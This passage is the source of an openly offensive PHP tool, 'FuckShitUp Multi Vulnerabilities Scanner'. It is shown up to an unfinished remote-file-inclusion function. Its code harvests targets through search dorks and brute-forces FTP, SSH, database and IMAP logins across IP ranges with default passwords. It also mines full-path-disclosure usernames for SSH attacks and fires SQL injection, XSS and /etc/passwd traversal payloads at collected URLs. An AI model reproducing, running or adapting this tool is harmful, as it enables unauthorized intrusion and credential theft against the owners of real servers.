<?php

/*

FuckShitUp Multi Vulnerabilities Scanner 0.1

MultiBrtuer requirements (php5):
php5-mysql - for mysql connections
php5-pgsql - for postgresql connections
libssh2-php - for ssh connections
php5-sybase - for mssql connections
php5-imap - for imap connections

TODO:
 - Więcej sprawnych szukajek, poprawić Yandex
 - Poprawić wydajność szukajek, massurl
  - SQL Injector
  - RFI shell uploader

~Smash_

*/

set_time_limit(0);
error_reporting(0);


function options() {

passthru('clear');

print "\033[0;38m";
print "     _____              __           .__    .__  __                \n";
print "   _/ ____\_ __   ____ |  | __  _____|  |__ |__|/  |_ __ ________  \n";
print "   \   __\  |  \_/ ___\|  |/ / /  ___/  |  \|  \   __\  |  \____ \ \n";
print "    |  | |  |  /\  \___|    <  \___ \|   Y  \  ||  | |  |  /  |_> >\n";
print "    |__| |____/  \___  >__|_ \/____  >___|  /__||__| |____/|   __/ \n";
print "                     \/     \/     \/     \/               |__|  v0.1\n";

print "\n\033[0;37m";

print "   .---\033[0;38m[SCAN]\033[0;37m-----------------------"."---\033[0;38m[FILES]\033[0;37m---------------------. \n";
print "   | scan - Do it!                 |"." search - DB's serch           |\n";
print "   | multibruter - Brute dat bitch |"." show - Display specific file  |\n";;
print "   | brutefpds - Brute ssh w/ fpd  |"." clear - Remove duplicates     |\n";;
print "   | stat - Status                 |"." filter - Filter grab results  |\n";
print "   |---\033[0;38m[TARGET]\033[0;37m---------------------"."---\033[0;38m[OTHERS]\033[0;37m--------------------| \n";
print "   | massurl - Massive grabber     |"." top - Top sites scanner       |\n";
print "   | dork - Well...                |"." cmd - Execute OS command      |\n";
print "   | geturl - Grab url's           |"." help - Shit's right here      |\n";
print "   | fpds - Grab fpds & users      |"." exit - Quits                  |\n";
print "   '--------------------------------"."-------------------------------'\n";

}

function geturl() {

	print "\n Dork: ";
    	$search = fopen ("php://stdin","r");
		$dork = fgets($search);
		$dork = trim($dork);

	print "\n Services available: \n";
	print "    [1] Interia\n";
	print "    [2] Google\n";
	print "    [3] Yandex\n";
    print "    [4] Onet\n";
	print "      Use: ";

    	$service = fopen ("php://stdin","r");
		$serv = fgets($search);
	print "\n Pages: ";
		$count = fopen ("php://stdin","r");
		$start = fgets($count);
		$start = trim($start);
	print "\n Output filename: ";
		$file = fopen ("php://stdin","r");
		$filename = fgets($file);
		$filename = trim($filename);

if($serv == 2) {	

	print "\nGrabbing!\n\n";

	$fp = fopen('out/'.$filename, 'a');
	for($i=0;$i<$start;$i++) {

	$url = 	"http://ajax.googleapis.com/ajax/services/search/web?v=1.0&q=".urlencode($dork)."&start=".$i;
	$body = file_get_contents($url);
	$json = json_decode($body);
	$jay = $json->responseData->results;
	for($x=0;$x<count($jay);$x++){
		fwrite($fp, urldecode($jay[$x]->url)."\n");
		print urldecode($jay[$x]->url)."\n";
	}
	}


	fclose($fp);

}

elseif($serv == 4) {

    $fp = fopen('out/'.$filename, 'a');
    for($i=0; $i <= $start; $i++) {

    $url =  "http://szukaj.onet.pl/0,".$i.",query.html?qt=".urlencode($dork);
    if(preg_match_all("'<a.*?href=\"(http[s]*://[^>\"]*?)\"[^>]*?>(.*?)</a>'si", file_get_contents($url), $links, PREG_PATTERN_ORDER))
    $all_hrefs = array_unique($links[1]);
    for($i = 0; $i <= 13; $i++) {
        unset($all_hrefs[$i]);
    }
    for($i = 0; $i <= 4; $i++) {
        array_pop($all_hrefs);
    }
    foreach($all_hrefs as $href) {
        fwrite($fp, urldecode($href)."\n");
        print urldecode($href)."\n";
    }

}
fclose($fp);
    }


elseif($serv == 3) {

	print "\nGrabbing!\n\n";

	$fp = fopen('out/'.$filename, 'a');

for($i = 0; $i <= $start; $i++) {


$url ='http://www.yandex.com/msearch?p='.$i.'&text='.urlencode($dork);
//$url ='http://yandex.hohli.com/?query='.urlencode($dork).'&page='.$i;
if(preg_match_all("/<a\s[^>]*href=\"([^\"]*)\"[^>]*>(.*)<\/a>/siU", file_get_contents($url), $links, PREG_PATTERN_ORDER))
    $all_hrefs = array_unique($links[1]);
	foreach($all_hrefs as $href) {
		fwrite($fp, urldecode($href)."\n");
		print urldecode($href)."\n";
	}

}
fclose($fp);
}

 elseif($serv == 1) {

	print "\nGrabbing!\n\n";

	$fp = fopen('out/'.$filename, 'a');

for($i = 0; $i <= $start; $i++) {
$url ='http://www.google.interia.pl/szukaj,q,'.urlencode($dork).',w,,p,'.$i;
if(preg_match_all("'<a.*?href=\"(http[s]*://[^>\"]*?)\"[^>]*?>(.*?)</a>'si", file_get_contents($url), $links, PREG_PATTERN_ORDER))
    $all_hrefs = array_unique($links[1]);
    for($i = 0; $i <= 6; $i++) {
        unset($all_hrefs[$i]);
    }
	array_pop($all_hrefs);
	foreach($all_hrefs as $href) {
		fwrite($fp, urldecode($href)."\n");
		print urldecode($href)."\n";
	}

}
	
} else {
	print "Wrong service number.";
}
}

function url_get_contents ($Url) {
    if (!function_exists('curl_init')){ 
        die('CURL is not installed!');
    }
    $ch = curl_init();
    curl_setopt($ch, CURLOPT_URL, $Url);
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
    $output = curl_exec($ch);
    curl_close($ch);
    return $output;
}

function fpds() {

print "\n Options:\n";  
print "   wp - Wordpress fpd's\n";
print "   presta - PrestaShop fpd's\n";
print "   vb - vBulletin fpd's\n";

print "\n What: ";
$handle = fopen ("php://stdin","r");
$line = fgets($handle);
$lin = trim($line);

print "\n Domain: ";
$handler = fopen ("php://stdin","r");
$dom = fgets($handler);
$domain = trim($dom);

print "\n Pages: ";
$handlerr = fopen ("php://stdin","r");
$pag = fgets($handlerr);
$page = trim($pag);

print "\n Output: ";
$handlerrr = fopen ("php://stdin","r");
$out = fgets($handlerrr);
$output = trim($out);


if($lin == 'wp') {

print "\nGrabbing!\n\n";
$fp = fopen('out/'.$output.'-tmp.txt', 'a');
$dork = 'site:'.$domain.' inurl:"wp-includes/rss-functions.php"';

for($i=0;$i<$page;$i++) {

$url = "http://ajax.googleapis.com/ajax/services/search/web?v=1.0&q=".urlencode($dork)."&start=".$i;
$body = file_get_contents($url);
$json = json_decode($body);
$jay = $json->responseData->results;
for($x=0;$x<count($jay);$x++){

if(preg_match("/\/home\/(\w*)/", file_get_contents(urldecode($jay[$x]->url)), $path)) {
    print urldecode($jay[$x]->url).":".$path[1]."\n";
    fwrite($fp, urldecode($jay[$x]->url).":".$path[1]."\n");
}

}
}

print "\nClearing the output...\n";

passthru('sort out/'.$output.'-tmp.txt | uniq >> out/'.$output.'.txt');
passthru('rm out/'.$output.'-tmp.txt');
print "\nDone! Saved as ".$output.".txt!";

}

if($lin == 'presta') {

print "\nGrabbing!\n\n";
$fp = fopen('out/'.$output.'-tmp.txt', 'a');
$dork = 'site:'.$domain.' inurl:footer.php OR inurl:header.php intext:"FrontController"';

for($i=0;$i<$page;$i++) {

$url = "http://ajax.googleapis.com/ajax/services/search/web?v=1.0&q=".urlencode($dork)."&start=".$i;
$body = file_get_contents($url);
$json = json_decode($body);
$jay = $json->responseData->results;
for($x=0;$x<count($jay);$x++){

if(preg_match("/\/home\/(\w*)/", file_get_contents(urldecode($jay[$x]->url)), $path)) {
    print urldecode($jay[$x]->url).":".$path[1]."\n";
    fwrite($fp, urldecode($jay[$x]->url).":".$path[1]."\n");
}

}
}

print "\nClearing the output...\n";

passthru('sort out/'.$output.'-tmp.txt | uniq >> out/'.$output.'.txt');
passthru('rm out/'.$output.'-tmp.txt');
print "\nDone! Saved as ".$output.".txt!";

}

}


function multibruter() {

$users = array('root');
$passes = array('', 'root', 'test', 'admin', 'zaq123wsx', '1234', '12345', '123456', 'haslo', 'Password123');
$imap_users = array('postmaster', 'hostmaster', 'master', 'admin', 'administrator', 'test', 'root', 'demo');

print "\n Options:\n";
print "  [1] Grab IP\n";
print "  [2] Continue\n";
print "   What: ";

		$check = fopen ("php://stdin","r");
		$czk = fgets($check);
		$czk = trim($czk);

if($czk == 1) {

print "\n URL: ";
	$url = fopen ("php://stdin", "r");
	$www = fgets($url);
	$www = trim($www);
	$ip = gethostbyname($www);
print "\n IP - ".$ip."\n";

}		

elseif($czk == 2) {

	print "\n First IP: ";
    	$fir = fopen ("php://stdin","r");
		$first = fgets($fir);
		$first = trim($first);

	print "\n Last IP: ";
    	$sec = fopen ("php://stdin","r");
		$second = fgets($sec);
		$second = trim($second);


 if(ip2long($first) && ip2long($second) !== FALSE) {

	print "\n Options:";
	print "\n  [1] FTP";
	print "\n  [2] SSH";
	print "\n  [3] DB's (PgSQL,MySQL,MsSQL)";
	print "\n  [4] IMAP";
	print "\n  [5] All";
	print "\n   What: ";

    	$what = fopen ("php://stdin","r");
		$sup = fgets($what);
		$sup = trim($sup);

	if($sup == 1 || $sup == 5) {
		print "\nFTP user: ";
		$ftp = fopen ("php://stdin","r");
		$ftpuser = fgets($ftp);
		$ftpuser = trim($ftpuser);
	}	

	for ($ip = ip2long($first); $ip<=ip2long($second); $ip++) {

		print "\n \033[1;37m[+]\033[0;37m ".long2ip($ip)."\n";

		if($sup == 1 || $sup == 5) {
		if($checkftp = @fsockopen(long2ip($ip), 21, $errno, $errstr, 5)){
        print "\n - FTP found on port 21\n";
        $ftpconn = ftp_connect(long2ip($ip));
        if(ftp_login($ftpconn, 'anonymous', '')) {
        	$text = date('j/y - G:i') . " - FTP - " . long2ip($ip) . " - Anonymous login\n";
    		$handle = fopen('out/multibruter.txt', 'a');
    		fwrite($handle, $text);
    		fclose($handle);

            print "\033[1;37mAnonymous login allowed!\033[0;37m\n";
            print " - General info\n";
            print " Files in directory (".ftp_pwd($ftpconn).") :\n";
            $ftpfiles = ftp_rawlist($ftpconn, ftp_pwd($ftpconn));
            foreach ($ftpfiles as $plik) {
                print $plik."\n";
            }
            ftp_close($ftpconn);
        } else {
            print " - FTP anonymous login not allowed\n";
            ftp_close($ftpconn);
        }


      if($ftpuser != '') { 
        print "\n Bruteforcing...\n";
                foreach ($passes as $haslo){
                    $ftpconn = ftp_connect(long2ip($ip));
                        if(ftp_login($ftpconn, $ftpuser, $haslo)) {
            $text = date('j/y - G:i') . " - FTP - " . long2ip($ip) . " - ".$ftpuser.":".$haslo."\n";
    		$handle = fopen('out/multibruter.txt', 'a');
    		fwrite($handle, $text);
    		fclose($handle);

            print "\033[1;37m" . $ftpuser . ':' . $haslo . " - Success!\033[0;37m\n";
            print " - General info\n";
            print " Current directory - ".ftp_pwd($ftpconn)."\n";
            print " Files in directory:\n";
            $ftpfiles = ftp_rawlist($ftpconn, ftp_pwd($ftpconn));
            foreach ($ftpfiles as $plik) {
            echo $plik."\n";
            }
             ftp_close($ftpconn);
             break;
                        } else {
             echo  $ftpuser . ':' . $haslo . "\n";
                        }
                }
        } else {
            print "\nFTP user is not defined, wont bruteforce.\n";
        }
            
    } else {
        print "\n - FTP seems not working (21)\n";
    }
		}

	if($sup == 2 || $sup == 5) {

		if($checkssh = fsockopen(long2ip($ip), 22, $errno, $errstr, 5)) {
        print "\n - SSH found on port 22\n";
        print "\n Bruteforcing...\n";

        $sshconn = ssh2_connect(long2ip($ip), 22);

        foreach ($users as $uzytkownik){
        foreach ($passes as $haslo){

          if(ssh2_auth_password($sshconn, $uzytkownik, $haslo))
          {
        print "\033[1;37m" . $uzytkownik . ':' . $haslo . " - Success! \033[0;37m\n";
             $text = date('j/y - G:i') . " - SSH - " . long2ip($ip) . " - ".$uzytkownik.":".$haslo."\n";
    		$handle = fopen('out/multibruter.txt', 'a');
    		fwrite($handle, $text);
    		fclose($handle);
        ssh2_exec($sshconn, 'exit');
        break;
          } else {
        print  $uzytkownik . ":" . $haslo . "\n";
          }

        }
        }
        } else { 
            print "\n - SSH seems not working (22)\n";
        }

	}


	if($sup == 3 || $sup == 5) {

        if ($checkmssql = fsockopen(long2ip($ip), 1433, $errno, $errstr, 5)) {
        print "\n - MsSQL found on port 1433\n";
        print "\n Bruteforcing...\n";
                $mssqluser = 'sa';
                foreach ($passes as $haslo) {
                    $mssqlconn = mssql_connect(long2ip($ip), $mssqluser, $haslo);
                        if($mssqlconn) {

              print "\033[1;37m" . $mssqluser . ':' . $haslo . " - Success! \033[0;37m\n";
             $text = date('j/y - G:i') . " - MsSQL - " . long2ip($ip) . " - ".$mssqluser.":".$haslo."\n";
    		$handle = fopen('out/multibruter.txt', 'a');
    		fwrite($handle, $text);
    		fclose($handle);

        pg_close($mssqlconn);
                        } else {
        print  $mssqluser . ':' . $haslo . "\n";
                        }
                }
                } else {
        print "\n - MsSQL seems not working (1433)\n";
      }

            if(fsockopen(long2ip($ip), 3306, $errno, $errstr, 5)){
        print "\n - MySQL found on port 3306. \n";
        print "\n Bruteforcing...\n";
        foreach ($users as $uzytkownik){
        foreach ($passes as $haslo){
        $conn = mysql_connect(long2ip($ip), $uzytkownik, $haslo);
            if ($conn)  {

            print "\033[1;37m" . $uzytkownik . ':' . $haslo . " - Success! \033[0;37m\n";
            $text = date('j/y - G:i') . " - MySQL - " . long2ip($ip) . " - ".$mssqluser.":".$haslo."\n";
    		$handle = fopen('out/multibruter.txt', 'a');
    		fwrite($handle, $text);
    		fclose($handle);

        $dbuser = mysql_query("SELECT USER();");
        $dbuzer = mysql_fetch_row($dbuser);
        $dbdb = mysql_query("SELECT DATABASE();");
        $dbd = mysql_fetch_row($dbdb);
        print "\nGeneral info\n";
        print "MySql version - ".mysql_get_client_info()."\n";
        print "Host info - ".mysql_get_host_info()."\n";
        print "Current user - ".$dbuzer[0]."\n";

        print "\nDatabases\n";
        $res = mysql_query("SHOW DATABASES");

    while ($row = mysql_fetch_assoc($res)) {
        print $row['Database'] . "\n";
    }

        mysql_close($conn);
        break;
            } else {
        print $uzytkownik . ':' . $haslo . "\n";
        }
        }

    }
    } else {
        print "\n - MySQL seems not working (3306)\n";
    }

    $checkpgsql = fsockopen(long2ip($ip), 5432, $errno, $errstr, 5);
            if($checkpgsql){
        print "\n -  PostgreSQL found on port 5432\n";
        print "\n Bruteforcing...\n";
            $pguser = 'postgres';
            foreach ($passes as $haslo) {
                $pgconn = pg_connect("host=".long2ip($ip)." user=".$pguser." password=".$haslo);
                if ($pgconn) {

             print "\033[1;37m" . $pguser . ':' . $haslo . " - Success! \033[0;37m\n";
            $text = date('j/y - G:i') . " - PgSQL - " . long2ip($ip) . " - ".$pguser.":".$haslo."\n";
    		$handle = fopen('out/multibruter.txt', 'a');
    		fwrite($handle, $text);
    		fclose($handle);

               print "\nGeneral info\n";
               print "Version - ".pg_version($pgconn)."\n";
               print "Host - ".pg_host($pgconn)."\n";
               pg_close($pgconn);
                } else 
                {
        print $pguser . ':' . $haslo . "\n";
                }
            }

    } else {
        print "\n - PostgreSQL seems not working (5432)\n";
    }
	}

	if($sup == 4 || $sup == 5) {

		if ($checkimap = fsockopen(long2ip($ip), 143, $errno, $errstr, 5)) {
        print "\n - IMAP found on port 143 \n";
        print "\n Bruteforcing...\n";
        foreach ($imap_users as $uzytkownik) {
            foreach ($passes as $haslo) {
                $mailbox = imap_open("{".long2ip($ip).":143}", $uzytkownik, $haslo);
                    if ($mailbox) {
             print "\033[1;37m" . $uzytkownik . ':' . $haslo . " - Success! \033[0;37m\n";
             $text = date('j/y - G:i') . " - IMAP - " . long2ip($ip) . " - ".$uzytkownik.":".$haslo."\n";
    		$handle = fopen('out/multibruter.txt', 'a');
    		fwrite($handle, $text);
    		fclose($handle);
            imap_close($mailbox);
            break;
                    } else {
        print  $uzytkownik . ":" . $haslo . "\n";
                    }
            }

        }
            } else {
             print "\n - IMAP seems not working (143)\n";
            }

	}

	}



} else {
	print "\nWrong IP adress.\n";
}
}
}

function brutefpds() {

print "\n FPD's file: ";
$handle = fopen ("php://stdin","r");
$fil = fgets($handle);
$file = trim($fil);

if(file_exists('out/'.$file)) {

$lines = file('out/'.$file);
foreach($lines as $line) {

    $stuff = explode(':', $line);
    $url = $stuff[0].':'.$stuff[1];
    $url = parse_url($url);

print "\n [+] Trying ".$url['host']." (".gethostbyname($url['host']).") with user ".$stuff[2]."\n";

        if($checkssh = fsockopen(gethostbyname($url['host']), 22, $errno, $errstr, 5)) {
        print "- SSH found on port 22\n";
        print "\n Bruteforcing...\n";

        $sshconn = ssh2_connect(gethostbyname($url['host']), 22);
        $uzytkownik = trim($stuff[2]);
        $passes = array('', 'root', 'test', 'admin', 'zaq123wsx', '1234', '12345', '123456', 'haslo', 'Password123');
        
        foreach ($passes as $haslo){

          if(ssh2_auth_password($sshconn, $uzytkownik, $haslo))
          {
        print "\033[1;37m" . $uzytkownik . ':' . $haslo . " - Success! \033[0;37m\n";
             $text = date('j/y - G:i') . " - SSH - " . gethostbyname($url['host']) . " - ".$uzytkownik.":".$haslo."\n";
            $handle = fopen('out/brutedfpds.txt', 'a');
            fwrite($handle, $text);
            fclose($handle);
        ssh2_exec($sshconn, 'exit');
        break;
          } else {
        print  $uzytkownik . ":" . $haslo . "\n";
          }

        }
        
        } else { 
            print " - SSH seems not working (22)\n";
        }

}

} else {
    print "\nFile doesn't exist!\n";
}

}

function dork() {

print "\n Options: \n";
print "  [1] Configs (inc,bak,old)\n";
print "  [2] Databases - (sql,configs)\n";
print "  [3] SQLi (error based)\n";
print "     What: ";

$choice = fopen ("php://stdin","r");
$what = fgets($choice);


		print "\n Options:\n";
		print "  [1] Display\n";
		print "  [2] Save to file\n";
		print "  [3] Both\n";
		print "     What: ";

		$sup = fopen ("php://stdin","r");
		$yo = fgets($sup);

	print "\n";

for($i = 0; $i <=3 ; $i++) {
		if($what == 1) {

$url1 = 'http://www.google.interia.pl/szukaj,q,'.urlencode('ext:bak').',w,pl,p,'.$i;
$url2 = 'http://www.google.interia.pl/szukaj,q,'.urlencode('ext:inc').',w,pl,p,'.$i;
$url3 = 'http://www.google.interia.pl/szukaj,q,'.urlencode('ext:old').',w,pl,p,'.$i;
$shit = array($url1, $url2, $url3);
			}
		if($what == 2) {
$url1 = 'http://www.google.interia.pl/szukaj,q,'.urlencode('ext:sql').',w,pl,p,'.$i;
$url2 = 'http://www.google.interia.pl/szukaj,q,'.urlencode('ext:inc mysql_connect').',w,pl,p,'.$i;
$url2 = 'http://www.google.interia.pl/szukaj,q,'.urlencode('ext:inc mysql_pconnect').',w,pl,p,'.$i;
$shit = array($url1, $url2, $url3);			}
		if($what == 3) {
$url1 = 'http://www.google.interia.pl/szukaj,q,'.urlencode('intext:"error in your SQL syntax" " .php').',w,pl,p,'.$i;
$url2 = 'http://www.google.interia.pl/szukaj,q,'.urlencode('intext:"supplied argument is not a valid MySQL" " .php').',w,pl,p,'.$i;
$shit = array($url1, $url2, $url3);
			}
foreach($shit as $url) {
if (preg_match("/(youtube)/(facebook)|(lastfm)/(github)/(wikipedia)/(stackoverflow)/(wykop)/(filmweb)/(allegro)/", $url) == FALSE)  {
if(preg_match_all("'<a.*?href=\"(http[s]*://[^>\"]*?)\"[^>]*?>(.*?)</a>'si", file_get_contents($url), $links, PREG_PATTERN_ORDER))
    $all_hrefs = array_unique($links[1]);
	unset($all_hrefs[0]);
	unset($all_hrefs[1]);
	unset($all_hrefs[2]);
	unset($all_hrefs[3]);
	unset($all_hrefs[4]);
	unset($all_hrefs[5]);
	unset($all_hrefs[6]);
	array_pop($all_hrefs);
	foreach($all_hrefs as $href) {
		if($yo == 2 || $yo == 3) {
		$fp = fopen('out/'.'d0rks.txt', 'a');
		$text = date('j/y - G:i') . " - " . urldecode($href);
		fwrite($fp, $text."\n");
		fclose($fp);
		}
		if ($yo == 1 || $yo == 3) {
		print " - ".urldecode($href)."\n";
	}
	}

}
}
}

}

function top() {

    print "\n Options:\n";
    print "  [1] Display urls\n";
    print "  [2] Grab some info\n";
    print "     What: ";
    
    $what = fopen ("php://stdin","r");
    $sup = fgets($what);
    $sup = trim($sup);

    print "\n Domain: ";
    $dmn = fopen ("php://stdin","r");
    $domain = fgets($dmn);
    $domain = strtoupper(trim($domain));

if($sup == 2) {
 $crawl = array('.htaccess', 'sql/', 'phpmyadmin/', 'robots.txt', 'info.php', 'administrator/',  'admin/', 'cms/', 'server-status/', 'config.php.bak', 'index.php.bak');
 $ports = array(21, 22, 23, 25, 53, 80, 110, 143, 443, 465, 3690, 1433, 3306, 5432, 8080);
 $x = 0;
for($i=0; $i<=20; $i++) {

$url = 'http://www.alexa.com/topsites/countries;'.$i.'/'.$domain;

if(preg_match_all("'<a href=\"(.*?)\">(.*?)</a>'si", file_get_contents($url), $links, PREG_PATTERN_ORDER))
    $all_hrefs = array_unique($links[1]);
    foreach($all_hrefs as $href) {

        if(strpos($href, "siteinfo")) {
        $uri = explode("/", $href);
        $adres = urldecode($uri[2]);
        $x++;
        print "\n $x. ".$adres." - ".gethostbyname($adres)."\n";

    print "\nOpen ports: ";
    foreach($ports as $port) {
        if($look = @fsockopen(gethostbyname($adres), $port, $err, $err_string, 1)) {
       echo $port.', ';
       fclose($look);
       } 
      }


    print "\nCrawling...\n";
    foreach ($crawl as $url) { 
    $urlnew = 'http://'.$adres.'/'.$url;   
    $ch = curl_init($urlnew);    
    curl_setopt($ch, CURLOPT_NOBODY, true);
    curl_exec($ch);
    $status = curl_getinfo($ch, CURLINFO_HTTP_CODE);

    if($status == 200){
       echo " ".$url." (".$status.")\n";
    }
    curl_close($ch);
    }

    passthru('dig any '.$adres);



    }
    }
}
} elseif($sup == 1) {

$x = 0;

for($i=0; $i<=20; $i++) {

$url = 'http://www.alexa.com/topsites/countries;'.$i.'/'.$domain;

if(preg_match_all("'<a href=\"(.*?)\">(.*?)</a>'si", file_get_contents($url), $links, PREG_PATTERN_ORDER))
    $all_hrefs = array_unique($links[1]);
    foreach($all_hrefs as $href) {
        if(strpos($href, "siteinfo")) {
        $uri = explode("/", $href);
        $adres = urldecode($uri[2]);
        $x++;
        print $x.'. '.$adres."\n";

    }
    }
}

}
}


function filter() {

	print "\n File: ";
	$filet = fopen ("php://stdin","r");
	$file = fgets($filet);
	$file = trim($file);	

	if(file_exists('out/'.$file)) {

		$urls = file('out/'.$file);
		$urls = array_unique($urls);
		foreach($urls as $url) {
	//	if (preg_match("/(filmweb)/(forum)/(hip-hop.pl)/(youtube)/(facebook)|(lastfm)/(github)/(wikipedia)/(stackoverflow)/(wykop)/(allegro)/", $url) == FALSE && strpos($url, "="))  {
	if (preg_match('#\b(filmweb|forum|google|reddit|hip-hop.pl|youtube|facebook|lastfm|github|wikipedia|stackoverflow|wykop|allegro|phpbb|simplemachines|smf)\b#', $url) == FALSE && strpos($url, "="))  {
		$fp = fopen('out/filtered-'.$file, 'a');
		fwrite($fp, $url."\n");	
		fclose($fp);
		} 

}
	print "\n\nDone! Saved as filtered-".$file."\n";
	} else {
		print "\nFile doesn't exist!";
	}

}

function massurl() {

	print "\n Tags: ";
	$filet = fopen ("php://stdin","r");
	$tags = fgets($filet);
	$tags = trim($tags);
	print "\n Output: ";
	$fileo = fopen ("php://stdin","r");
	$output = fgets($fileo);
	$output = trim($output);

	if(file_exists('out/'.$tags)) {

		$tags = file('out/'.$tags);
		foreach($tags as $tag) {
for($i = 0;$i < 3; $i++) {
$url = 'http://www.google.interia.pl/szukaj,q,'.$tag.' .php'.',w,pl,p,'.$i;
if(preg_match_all("'<a.*?href=\"(http[s]*://[^>\"]*?)\"[^>]*?>(.*?)</a>'si", file_get_contents($url), $links, PREG_PATTERN_ORDER))
{
	$all_hrefs = array_unique($links[1]);
	unset($all_hrefs[0]);
	unset($all_hrefs[1]);
	unset($all_hrefs[2]);
	unset($all_hrefs[3]);
	unset($all_hrefs[4]);
	unset($all_hrefs[5]);
	unset($all_hrefs[6]);
	array_pop($all_hrefs);
	foreach($all_hrefs as $href) {
		$fp = fopen('out/'.$output, 'a');
		$text =  urldecode($href)."\n";
		fwrite($fp, $text);
		print " - ".urldecode($href)."\n";
	
	}
}
}
}

		

	} else {
		print "\nFile ".$tags." doesnt exist!";
	}

}


function sqli($link) {


if(strpos($link, '=') !== false) {
   	$linki = array();
    $zmienne = explode("?",  $link);
    $zmienne2 = explode("&", $zmienne[1]);
    foreach($zmienne2 as $zmienna){
    $rozbite = explode("=", $zmienna);
    $linki[] .= str_replace($rozbite[0] . "=" . $rozbite[1], $rozbite[0] . "=" . $rozbite[1] . "'", $link);
    
    }
    foreach($linki as $lin) {
        $reg = "/error in your SQL syntax|mysql_fetch_array()|execute query|mysql_fetch_object()|mysql_num_rows()|mysql_fetch_assoc()|mysql_fetch_row()|SELECT * FROM|supplied argument is not a valid MySQL|Syntax error|Fatal error|SQL command not properly ended|Microsoft SQL Native Client error|Query failed: ERROR: syntax error/i";
    	if (preg_match($reg, file_get_contents($lin)) && !preg_match($reg, file_get_contents($link)))  {
    		$text = $lin . "\n";
    		$handle = fopen('out/sqli.txt', 'a');
    		fwrite($handle, $text);
    		fclose($handle);
    		print "\033[1;37m1\033[0;37m";
    	} else {
    		print '0';
    	}
    }
 } else {

if(strpos($link, ".php")) {
    
$url = $link . "'";

  	if(preg_match("/error in your SQL syntax|mysql_fetch_array()|execute query|mysql_fetch_object()|mysql_num_rows()|mysql_fetch_assoc()|mysql_fetch_row()|SELECT * FROM|supplied argument is not a valid MySQL|Syntax error|Fatal error|SQL command not properly ended|Microsoft SQL Native Client error|Query failed: ERROR: syntax error/i", file_get_contents($url))) {
    		$text = $url . "\n";
    		$handle = fopen('out/sqli.txt', 'a');
    		fwrite($handle, $text);
       		fclose($handle);
    		print "\033[1;37mI\033[0;37m";
 } else {
 	print "O";
 }

 } else {
 	print "O";
 }


}

}

function xss($link) {

$all = parse_url($link);

if(strpos($link, '=') !== false) {
    $linki = array();
    $zmienne = explode("?",  $link);
    $zmienne2 = explode("&", $zmienne[1]);
    foreach($zmienne2 as $zmienna){
    $rozbite = explode("=", $zmienna);
    $linki[] .= str_replace($rozbite[0] . "=" . $rozbite[1], $rozbite[0] . "=" . urlencode("'>\"><script>alert(6661337);</script>"), $link);
    }
    foreach($linki as $lin) {
    	if (strpos(file_get_contents($lin), "<script>alert(6661337);</script>"))  {
    		$text = urldecode($lin) . "\n";
    		$handle = fopen('out/xss.txt', 'a');
    		fwrite($handle, $text);
       		fclose($handle);
    		print "\033[1;37m1\033[0;37m";
    	} else {
    		print '0';
    	}
    }
 }

else {

$all = parse_url($link);

$url = $link . "'>\"><script>alert(6661337);</script>";

  	if(strpos(url_get_contents($url), "<script>alert(6661337);</script>")) {
    		$text = $url . "\n";
    		$handle = fopen('out/xss.txt', 'a');
    		fwrite($handle, $text);
       		fclose($handle);
    		print "\033[1;37mI\033[0;37m";
 } else {
 	print 'O';
 }

}
}


function clear() {

		print "\n File: ";
    	$whichf = fopen ("php://stdin","r");
		$file = fgets($whichf);
		$file = trim($file);
		if(file_exists('out/'.$file)) {

		passthru('sort out/'.$file.' | uniq >> out/clear-'.$file);
		print "\nDone! Saved as clear-".$file."\n";
		 
		 } else {
			print "\nFile doesn't exist!\n";
		}
}

function lfi($link) {

	$lfi = array(
"%2Fetc%2Fpasswd",
"..%2Fetc%2Fpasswd",
"..%2F..%2Fetc%2Fpasswd",
"..%2F..%2F..%2Fetc%2Fpasswd",
"..%2F..%2F..%2F..%2Fetc%2Fpasswd",
"..%2F..%2F..%2F..%2F..%2Fetc%2Fpasswd",
"..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fpasswd",
"..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fpasswd",
"..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fpasswd",
"..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fpasswd",
"..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fpasswd",
"..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fpasswd",
"..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fpasswd",
"%2Fetc%2Fpasswd%00",
"..%2Fetc%2Fpasswd%00",
"..%2F..%2Fetc%2Fpasswd%00",
"..%2F..%2F..%2Fetc%2Fpasswd%00",
"..%2F..%2F..%2F..%2Fetc%2Fpasswd%00",
"..%2F..%2F..%2F..%2F..%2Fetc%2Fpasswd%00",
"..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fpasswd%00",
"..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fpasswd%00",
"..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fpasswd%00",
"..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fpasswd%00",
"..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fpasswd%00",
"..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fpasswd%00",
"..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fpasswd%00"
);


if(strpos($link, '=') !== false) {
    $linki = array();
    $zmienne = explode("?",  $link);
    $zmienne2 = explode("&", $zmienne[1]);
    foreach($zmienne2 as $zmienna){
        foreach($lfi as $vuln) {
    $rozbite = explode("=", $zmienna);
    $linki[] .= str_replace($rozbite[0] . "=" . $rozbite[1], $rozbite[0] . "=" . $vuln, $link);
    }
    foreach($linki as $lin) {
    	if (preg_match("/root:x:/", file_get_contents($lin)))  {
    		$text = $lin . "\n";
    		$handle = fopen('out/lfi.txt', 'a');
    		fwrite($handle, $text);
    	    fclose($handle);
    		print "\033[1;37m1\033[0;37m";
    		break;
    	} else {
    		print '0';
    	}
    }
   }
 } else {
 	print 'O';
 }

}

function rfi($link) {

if(strpos($link, '=') !== false) {
    $linki = array();
    $zmienne = explode("?",  $link);
    $zmienne2 = explode("&", $zmienne[1]);
    foreach($zmienne2 as $zmienna){
